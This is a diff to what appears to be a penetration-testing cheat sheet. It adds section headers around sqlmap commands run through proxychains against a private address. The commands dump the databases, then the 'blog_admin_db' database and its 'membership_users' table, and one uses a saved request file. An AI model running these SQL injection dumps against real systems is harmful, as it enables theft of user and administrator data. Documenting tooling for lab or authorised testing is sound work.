@@ -1,5 +1,14 @@
- proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump
- proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump -D "blog_admin_db"
- proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump -D "blog_admin_db" -T “membership_users”
+==============================================================================
+[+] SQLmap 
+==============================================================================
+
+proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump
+proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump -D "blog_admin_db"
+proxychains sqlmap -u http://172.16.1.12/blog/single.php?id=4 --level 5 --risk 3 --dbms mysql --threads 10 --dump -D "blog_admin_db" -T “membership_users”
+
+==============================================================================
+[+] SQLmap with request
+==============================================================================
+proxychains sqlmap -r request2.req --level 2 --risk 1
 
  
